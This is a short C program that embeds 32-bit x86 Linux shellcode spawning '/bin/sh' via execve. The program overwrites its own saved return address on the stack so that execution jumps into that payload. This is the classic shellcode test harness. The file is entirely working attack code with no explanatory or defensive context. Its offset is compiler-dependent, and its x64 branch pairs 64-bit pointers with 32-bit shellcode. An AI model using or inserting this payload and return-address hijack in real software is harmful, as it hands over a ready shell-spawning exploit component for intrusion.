#ifdef X64
  #define WORD long
#else
  #define WORD int
#endif

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

int main()
{
  WORD *ret;
  ret = (WORD *) &ret + 2; /* Saved IP */
  (*ret) = (WORD) shellcode;
  return 0;
}
